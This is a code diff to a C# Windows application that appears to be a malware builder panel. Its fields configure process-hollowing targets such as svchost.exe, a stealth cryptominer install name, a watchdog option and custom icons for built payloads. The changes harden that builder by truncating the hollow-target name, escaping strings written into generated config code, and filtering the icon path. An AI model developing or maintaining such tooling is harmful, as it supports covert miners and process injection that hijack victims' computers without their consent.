@@ -456,9 +456,10 @@ public partial class ServerWindow : ThemedWindow
         var text = BldHollowTarget.Text?.Trim() ?? "";
         // If it's a raw process name, return as-is
         if (text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
-            return text;
+            return text.Length > 200 ? text[..200] : text;
         // Extract first word (process name) from display string
-        return text.Split(' ', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "svchost.exe";
+        var result = text.Split(' ', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "svchost.exe";
+        return result.Length > 200 ? result[..200] : result;
     }
 
     private void InitHollowTargets()
@@ -3725,11 +3726,12 @@ internal static class MinerConfig
             var installName    = BldMnrInstallName.Text.Trim();
             var hollowTarget   = (BldMnrHollow.IsChecked == true) ? GetHollowTarget() : "";
             var enableWatchdog = BldMnrWatchdog.IsChecked == true;
+            static string EscCs(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
             var cfgContent = $@"namespace MinerUninstaller;
 internal static class UninstallerConfig
 {{
-    public const string InstallName    = ""{installName.Replace("\"", "\\\"")}"";
-    public const string HollowTarget   = ""{hollowTarget.Replace("\"", "\\\"")}"";
+    public const string InstallName    = ""{EscCs(installName)}"";
+    public const string HollowTarget   = ""{EscCs(hollowTarget)}"";
     public const bool   EnableWatchdog = {(enableWatchdog ? "true" : "false")};
 }}
 ";
@@ -4284,7 +4286,7 @@ Read-Host 'Press Enter to close'
 
             var iconArg = "";
             var iconRaw = BldIconPath.Text;
-            if (BldSetIcon.IsChecked == true && !iconRaw.Contains('"') && File.Exists(iconRaw))
+            if (BldSetIcon.IsChecked == true && !iconRaw.Contains('"') && !iconRaw.Contains('%') && File.Exists(iconRaw))
             {
                 iconArg = $" -p:ApplicationIcon=\"{iconRaw}\"";
             }
